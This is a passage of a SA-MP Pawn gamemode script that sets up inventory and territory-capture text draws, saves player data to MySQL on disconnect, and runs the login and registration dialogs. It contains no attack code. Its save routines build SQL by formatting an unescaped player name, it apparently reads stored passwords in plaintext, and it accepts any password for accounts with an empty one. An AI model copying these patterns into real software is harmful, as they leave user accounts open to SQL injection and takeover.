	PlayerTextDrawColor(playerid,gVehInfo[playerid],0xffffffff);
	PlayerTextDrawSetOutline(playerid,gVehInfo[playerid],1);
	PlayerTextDrawSetProportional(playerid,gVehInfo[playerid],1);
	PlayerTextDrawSetShadow(playerid,gVehInfo[playerid],1);

	CaptureTime[playerid] = CreatePlayerTextDraw(playerid,20.00000, 240.00000, "~g~War for territory~n~~b~Time to end:~w~12:666~n~~g~Zone: ~w~GDE TO~n~~y~BALLAS:~w~12~n~~y~GROOVE:~w~13");
	PlayerTextDrawBackgroundColor(playerid,CaptureTime[playerid], 51);
    PlayerTextDrawAlignment(playerid,CaptureTime[playerid], 1);
    PlayerTextDrawLetterSize(playerid,CaptureTime[playerid], 0.410000, 1.000000);
    PlayerTextDrawFont(playerid,CaptureTime[playerid], 2);
    PlayerTextDrawColor(playerid,CaptureTime[playerid], -1);
    PlayerTextDrawSetOutline(playerid,CaptureTime[playerid], 1);
    PlayerTextDrawSetProportional(playerid,CaptureTime[playerid], 1);
	PlayerTextDrawSetShadow(playerid,CaptureTime[playerid],0);
	PlayerTextDrawUseBox(playerid,CaptureTime[playerid], 1);
	PlayerTextDrawBoxColor(playerid,CaptureTime[playerid], 70);
	PlayerTextDrawTextSize(playerid,CaptureTime[playerid], 185.000000, 22.000000);
    PlayerTextDrawHide(playerid, CaptureTime[playerid]);

    gUpdateInfo[0][playerid] = CreatePlayerTextDraw(playerid,608.875000, 178.833343, "usebox");
	PlayerTextDrawLetterSize(playerid,gUpdateInfo[0][playerid], 0.000000, 8.498149);
	PlayerTextDrawTextSize(playerid,gUpdateInfo[0][playerid], 537.375000, 0.000000);
	PlayerTextDrawAlignment(playerid,gUpdateInfo[0][playerid], 1);
	PlayerTextDrawColor(playerid,gUpdateInfo[0][playerid], 0);
	PlayerTextDrawUseBox(playerid,gUpdateInfo[0][playerid], true);
	PlayerTextDrawBoxColor(playerid,gUpdateInfo[0][playerid], 102);
	PlayerTextDrawSetShadow(playerid,gUpdateInfo[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid,gUpdateInfo[0][playerid], 0);
	PlayerTextDrawFont(playerid,gUpdateInfo[0][playerid], 0);

	gUpdateInfo[1][playerid] = CreatePlayerTextDraw(playerid,560.625000, 240.333297, "_");
	PlayerTextDrawLetterSize(playerid,gUpdateInfo[1][playerid], 0.190624, 1.734168);
	PlayerTextDrawAlignment(playerid,gUpdateInfo[1][playerid], 1);
	PlayerTextDrawColor(playerid,gUpdateInfo[1][playerid], -1);
	PlayerTextDrawSetShadow(playerid,gUpdateInfo[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid,gUpdateInfo[1][playerid], 1);
	PlayerTextDrawFont(playerid,gUpdateInfo[1][playerid], 1);
	PlayerTextDrawSetProportional(playerid,gUpdateInfo[1][playerid], 1);
	PlayerTextDrawBackgroundColor(playerid,gUpdateInfo[1][playerid], 51);

	gUpdateInfo[2][playerid] = CreatePlayerTextDraw(playerid,559.500000, 200.333343, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,gUpdateInfo[2][playerid], -86);
	PlayerTextDrawFont(playerid,gUpdateInfo[2][playerid], 5);
	PlayerTextDrawLetterSize(playerid,gUpdateInfo[2][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,gUpdateInfo[2][playerid], -1);
	PlayerTextDrawSetOutline(playerid,gUpdateInfo[2][playerid], 0);
	PlayerTextDrawSetProportional(playerid,gUpdateInfo[2][playerid], 1);
	PlayerTextDrawUseBox(playerid,gUpdateInfo[2][playerid], 1);
	PlayerTextDrawBoxColor(playerid,gUpdateInfo[2][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,gUpdateInfo[2][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, gUpdateInfo[2][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, gUpdateInfo[2][playerid], 0.000000, 0.000000, 90.000000, 0.100000);

	Inventory[0][playerid] = CreatePlayerTextDraw(playerid,1.000000, 1.299987, ""); // 412

	Inventory[1][playerid] = CreatePlayerTextDraw(playerid,31.000000, 164.299987, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[1][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[1][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[1][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[1][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[1][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[1][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[1][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[1][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[1][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[1][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[1][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[1][playerid], 1);

	Inventory[2][playerid] = CreatePlayerTextDraw(playerid,31.000000, 201.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[2][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[2][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[2][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[2][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[2][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[2][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[2][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[2][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[2][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[2][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[2][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[2][playerid], 1);

	Inventory[3][playerid] = CreatePlayerTextDraw(playerid,61.000000, 164.299987, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[3][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[3][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[3][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[3][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[3][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[3][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[3][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[3][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[3][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[3][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[3][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[3][playerid], 1);

	Inventory[4][playerid] = CreatePlayerTextDraw(playerid,61.000000, 201.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[4][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[4][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[4][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[4][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[4][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[4][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[4][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[4][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[4][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[4][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[4][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[4][playerid], 1);

	Inventory[5][playerid] = CreatePlayerTextDraw(playerid,91.000000, 164.299987, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[5][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[5][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[5][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[5][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[5][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[5][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[5][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[5][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[5][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[5][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[5][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[5][playerid], 1);

	Inventory[6][playerid] = CreatePlayerTextDraw(playerid,91.000000, 201.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[6][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[6][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[6][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[6][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[6][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[6][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[6][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[6][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[6][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[6][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[6][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[6][playerid], 1);

	Inventory[7][playerid] = CreatePlayerTextDraw(playerid,121.000000, 164.299987, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[7][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[7][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[7][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[7][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[7][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[7][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[7][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[7][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[7][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[7][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[7][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[7][playerid], 1);

	Inventory[8][playerid] = CreatePlayerTextDraw(playerid,121.000000, 201.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[8][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[8][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[8][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[8][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[8][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[8][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[8][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[8][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[8][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[8][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[8][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[8][playerid], 1);

	Inventory[9][playerid] = CreatePlayerTextDraw(playerid,151.000000, 164.299987, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[9][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[9][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[9][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[9][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[9][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[9][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[9][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[9][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[9][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[9][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[9][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[9][playerid], 1);

	Inventory[10][playerid] = CreatePlayerTextDraw(playerid,151.000000, 201.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[10][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[10][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[10][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[10][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[10][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[10][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[10][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[10][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[10][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[10][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[10][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[10][playerid], 1);

	//
	Inventory[11][playerid] = CreatePlayerTextDraw(playerid,31.000000, 238.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[11][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[11][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[11][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[11][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[11][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[11][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[11][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[11][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[11][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[11][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[11][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[11][playerid], 1);

	Inventory[12][playerid] = CreatePlayerTextDraw(playerid,61.000000, 238.000000, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[12][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[12][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[12][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[12][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[12][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[12][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[12][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[12][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[12][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[12][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[12][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[12][playerid], 1);

	Inventory[13][playerid] = CreatePlayerTextDraw(playerid,91.000000, 238.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[13][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[13][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[13][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[13][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[13][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[13][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[13][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[13][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[13][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[13][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[13][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[13][playerid], 1);

	Inventory[14][playerid] = CreatePlayerTextDraw(playerid,121.000000, 238.000000, "bistriislot"); // 412
	PlayerTextDrawBackgroundColor(playerid,Inventory[14][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[14][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[14][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[14][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[14][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[14][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[14][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[14][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[14][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[14][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[14][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[14][playerid], 1);

	Inventory[15][playerid] = CreatePlayerTextDraw(playerid,151.000000, 238.000000, "bistriislot");
	PlayerTextDrawBackgroundColor(playerid,Inventory[15][playerid], -86);
	PlayerTextDrawFont(playerid,Inventory[15][playerid], 5);
	PlayerTextDrawLetterSize(playerid,Inventory[15][playerid], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Inventory[15][playerid], -1);
	PlayerTextDrawSetOutline(playerid,Inventory[15][playerid], 0);
	PlayerTextDrawSetProportional(playerid,Inventory[15][playerid], 1);
	PlayerTextDrawUseBox(playerid,Inventory[15][playerid], 1);
	PlayerTextDrawBoxColor(playerid,Inventory[15][playerid], 0x00000000);
	PlayerTextDrawTextSize(playerid,Inventory[15][playerid], 27.000000, 32.000000);
	PlayerTextDrawSetPreviewModel(playerid, Inventory[15][playerid], 19461);
	PlayerTextDrawSetPreviewRot(playerid, Inventory[15][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
	PlayerTextDrawSetSelectable(playerid,Inventory[15][playerid], 1);

	Inventory[16][playerid] = CreatePlayerTextDraw(playerid,0.000000, 312.000000, "");
	return true;
}
stock SaveEda(playerid)
{
    new query[512];
	format(query,sizeof(query),"UPDATE `members` SET `burger`= '%i',`salad`= '%i',`pizza`= '%i',`sprunk`= '%i',`beer`= '%i',`vodka`= '%i',`brandy`= '%i',`wine`= '%i',`shawarma`= '%i' WHERE `nickname`='%s'",
	pTemp[playerid][pEda][0],pTemp[playerid][pEda][1],pTemp[playerid][pEda][2],pTemp[playerid][pEda][3],pTemp[playerid][pEda][4],pTemp[playerid][pEda][5],pTemp[playerid][pEda][6],pTemp[playerid][pEda][7],pTemp[playerid][pEda][8],Name2(playerid));
	mysql_empty(mysql, query);
}
stock OnPlayerDisconnecter(playerid)
{
    //KillTimer(STimer[playerid]);
    CheckTir(playerid);
	SaveEda(playerid);
	if(pData[playerid][pHouse] > 0)
	{
		if(pData[playerid][pCar] != 0 && gVehicles[pData[playerid][pHouse]][vvID] > 0)
		{
		    new query2[128];
			format(query2,sizeof(query2),"UPDATE `members` SET `fuel`='%f'WHERE `nickname`='%s'",
			gVehicles[gVehicles[pData[playerid][pHouse]][vvID]-1][vFuel],Name2(playerid));
			mysql_empty(mysql, query2);
			SetVehicleToRespawn(gVehicles[pData[playerid][pHouse]][vvID]);
	 	}
 	}
    ExitPlayerFromSlotMachine(playerid);

    TextDrawHideForPlayer(playerid,Digit1[0]);
	TextDrawHideForPlayer(playerid,Digit2[0]);
	TextDrawHideForPlayer(playerid,Digit3[0]);

	TextDrawHideForPlayer(playerid,Digit1[1]);
	TextDrawHideForPlayer(playerid,Digit2[1]);
	TextDrawHideForPlayer(playerid,Digit3[1]);

	TextDrawHideForPlayer(playerid,Digit1[2]);
	TextDrawHideForPlayer(playerid,Digit2[2]);
	TextDrawHideForPlayer(playerid,Digit3[2]);

	TextDrawHideForPlayer(playerid,Digit1[3]);
	TextDrawHideForPlayer(playerid,Digit2[3]);
	TextDrawHideForPlayer(playerid,Digit3[3]);

	TextDrawHideForPlayer(playerid,Digit1[4]);
	TextDrawHideForPlayer(playerid,Digit2[4]);
	TextDrawHideForPlayer(playerid,Digit3[4]);

	TextDrawHideForPlayer(playerid,Digit1[5]);
	TextDrawHideForPlayer(playerid,Digit2[5]);
	TextDrawHideForPlayer(playerid,Digit3[5]);

	TextDrawHideForPlayer(playerid,Box);

	if(SlotTimer[playerid] != -1) KillTimer(SlotTimer[playerid]);
    for(new k=0; k < 16; k++)
    {
        InventoryPlayer[playerid][invSlot][k] = 0;
        InventoryPlayer[playerid][invKol][k] = 0;
    }
	if(CaptureOn[playerid] == 1)
	{
     	CaptureOn[playerid] = 0;
		PlayerTextDrawDestroy(playerid, CaptureTime[playerid]);
	}
	if(GetPVarInt(playerid,"pgunobject"))
	{
		new objectid = GetPVarInt(playerid,"pgunobject");
		if(IsValidDynamicObject(objectid)) DestroyDynamicObject(objectid);
	}
	if(pData[playerid][pJob] == 3 && pTemp[playerid][pTaxiID] != INVALID_VEHICLE_ID)
	{
		SetVehicleToRespawn(pTemp[playerid][pTaxiID]);
		if(IsValid3DTextLabel(pTemp[playerid][pTaxi3DText])) DestroyDynamic3DTextLabelEx(pTemp[playerid][pTaxi3DText]);
	}
	if(pTemp[playerid][pCuffee] != INVALID_PLAYER_ID)
	{
		new id = pTemp[playerid][pCuffee];
		if(id == playerid)
		{
			new cuffer = pTemp[playerid][pCuffer];
			format(mes,sizeof(mes),"Арестованный {"#cWHITE"}%s {"#cINFO"}вышел из игры",Name2(playerid));
			SendClientMessage(cuffer,CINFO,mes);
			pTemp[cuffer][pCuffer] = INVALID_PLAYER_ID;
			pTemp[cuffer][pCuffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pCuffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pCuffer] = INVALID_PLAYER_ID;
		}
		else if(IsPlayerConnected(id))
		{
			SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(id,0);
			pTemp[id][pCuffer] = INVALID_PLAYER_ID;
			pTemp[id][pCuffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pCuffee] = INVALID_PLAYER_ID;
			pTemp[playerid][pCuffer] = INVALID_PLAYER_ID;
			SendClientMessage(playerid,CGREEN,"Офицер, надевший на Вас наручники, вышел из игры. Наручники сняты.");
		}
	}
	if(gCalls[playerid][g_caller] == playerid || gCalls[playerid][g_callee] == playerid)
	{
		new id;
		if(gCalls[playerid][g_caller] == playerid) id = gCalls[playerid][g_callee];
		else if(gCalls[playerid][g_callee] == playerid) id = gCalls[playerid][g_caller];
		else return SendClientMessage(playerid,CGRAY,"Ошибка (#112)");
		SendClientMessage(id,CYELLOW,"Собеседник вышел из игры");
		SetPlayerSpecialAction(id,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetTimerEx("ClearPhone",2000,false,"i",id);
		gCalls[playerid][g_caller] = INVALID_PLAYER_ID;
		gCalls[playerid][g_callee] = INVALID_PLAYER_ID;
		gCalls[id][g_caller] = INVALID_PLAYER_ID;
		gCalls[id][g_callee] = INVALID_PLAYER_ID;
		SetPVarInt(playerid,"pCall",0);
		SetPVarInt(id,"pCall",0);
	}
	if(gNewsDialee == playerid)
	{
		gNewsDialee = INVALID_PLAYER_ID;
		SendClientMessage(gNewsDialer,CSYSTEM,"Игрок вышел из игры");
	}
	if(gNewsDialer == playerid) OnPlayerCommandText(playerid,"/stopdial");
	new h,m,s;
	gettime(h,m,s);
	new gunids[56],ammos[56],cnt,pgun[128];
	for (new i;i<47;i++)
	{
		new weapid,ammo;
		GetPlayerWeaponData(playerid,i,weapid,ammo);
		if(weapid && ammo && gGuns[playerid][i] == weapid && gAmmos[playerid][i] <= ammo)
		{
			if(!cnt)
			{
				format(gunids,sizeof(gunids),"%d",gGuns[playerid][i]);
				format(ammos,sizeof(ammos),"%d",gAmmos[playerid][i]);
			}
			else
			{
				format(gunids,sizeof(gunids),"%s|%d",gunids,gGuns[playerid][i]);
				format(ammos,sizeof(ammos),"%s|%d",ammos,gAmmos[playerid][i]);
			}
			cnt++;
			if(cnt >= 6) break;
		}
	}
	new date[30],y1,d1,m1;
	getdate(y1,m1,d1);
	format(date,30,"%d-%d-%d",y1,m1,d1);
	if(strlen(gunids) && strlen(ammos)) format(pgun,sizeof(pgun),"%s:%s",gunids,ammos);
	new query[1024];
	format(query,sizeof(query),"UPDATE `members` SET `Pistol_Skill`='%d',`Eagle_Skill`='%d',`ShotGun_Skill`='%d',`MP5_Skill`='%d',`AK47_Skill`='%d',`M4_Skill`='%d',`Sniper_Skill`='%d',`last`='%s',`prison`='%d',`mut`='%d',`grain`='%d',`hunger`='%d',`stamina`='%d',`power`='%d',`health` = '%.2f',`armour` = '%.2f',`money` = %d,`bank`=%d,`level`=%d,`exp`=%d,jail=%d,gun='%s',status=0,fraction=%i,subfraction=%i,age=%i WHERE `nickname`='%s'",
	pData[playerid][pPistol_Skill],pData[playerid][pEagle_Skill],pData[playerid][pShotGun_Skill],pData[playerid][pMP5_Skill],pData[playerid][pAK47_Skill],pData[playerid][pM4_Skill],pData[playerid][pSniper_Skill],date,pData[playerid][pPrison],pData[playerid][pMut],pData[playerid][pGrain],pData[playerid][pHunger],pData[playerid][pStamina],pData[playerid][pPower],pData[playerid][pHealth],pData[playerid][pArmour],
	pData[playerid][pMoney],pData[playerid][pBank],pData[playerid][pLevel],pData[playerid][pExp],
	pData[playerid][pJail],pgun,pData[playerid][pFraction],pData[playerid][pSubfraction],pData[playerid][pAge],Name2(playerid));
	mysql_empty(mysql, query);
	if(mysql_errno()) printf("Mysql error while saving account ID,NICK,MYSQLID: %d/%s/%d",playerid,Name2(playerid),pData[playerid][pMysqlID]);
	return true;
}
public OnPlayerDisconnect(playerid, reason)
{
    new idx = cvector_find(players,playerid);
    if(idx !=-1) cvector_remove(players,idx);
    if(GetPVarInt(playerid,"Logined") == 1) OnPlayerDisconnecter(playerid);
	return true;
}
forward GetID_PlayerJoin(playerid);
public GetID_PlayerJoin(playerid){
	new query[128];
	format(query,sizeof(query),"SELECT `password`,`requestcode`,`code` FROM `members` WHERE `nickname` = '%s'",pRegData[playerid][0]);
	mysql_tquery(mysql, query, "GetPass_PlayerJoin", "d", playerid);
	return true;
}
forward GetPass_PlayerJoin(playerid);
public GetPass_PlayerJoin(playerid){
	if(cache_get_row_count(mysql)){
		new code[24];
		cache_get_field_content(0, "password", pRegData[playerid][1], mysql, 24);
		cache_get_field_content(0, "code", code, mysql);
		new request = cache_get_field_content_int(0, "requestcode", mysql);
		if(!strlen(pRegData[playerid][1]))
		{
			printf("ОШИБКА: Длина пароля игрока равна 0. Nik: %s",pRegData[playerid][0]);
			SendClientMessage(playerid,CWHITE,"В Ваш аккаунт возможно войти под любым паролем. (После авторизации, измените его)");
		}
		if(request) SetPVarString(playerid,"code",code);
		SPFD(playerid,dLogin,1,"Accountis Avtorizacia","Shemdeg","Gasvla","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Accountis Saxeli: {EBC9C9}%s{"#cWHITE"}\n\nEs Accounti Daregistrirebulia Serverze.\nRom Shexvidet Am Accountshi, Sheiyvanet Paroli:",pRegData[playerid][0]);
	}else SPFD(playerid,dRegister,1,"Personajis Registracia","Shemdeg","Gamosvla","{AD92F0}Mogesalmebit Serverze Difficult Stage Real Life.\n{B2A7CC}Accountis Saxeli: {EBC9C9}%s{"#cWHITE"}\n\nEs Accounti Ar Aris Daregistrirebuli.\nRom Daaregistrirot Tqveni Accounti, Sheiyvanet Paroli:",pRegData[playerid][0]);
	return true;
}
public OnPlayerJoin(playerid)
{
	TogglePlayerControllable(playerid,0);
	SpawnPlayer(playerid);
	InterpolateCameraPos(playerid, 165.525390, -1334.952880, 125.180915, 405.746795, -1661.017333, 68.126205, 3000);
	InterpolateCameraLookAt(playerid, 169.209930, -1338.014160, 123.748161, 405.957916, -1656.194213, 66.824951, 3000);
	GetPlayerName(playerid,pRegData[playerid][0],MAX_PLAYER_NAME);
	new query[128];
	mysql_real_escape_string(pRegData[playerid][0],pRegData[playerid][0]);
	format(query,sizeof(query),"SELECT `id` FROM `members` WHERE `nickname` = '%s'",pRegData[playerid][0]);
	mysql_tquery(mysql, query, "GetID_PlayerJoin", "d", playerid);
	return true;
}
public OnPlayerSpawn(playerid)
{
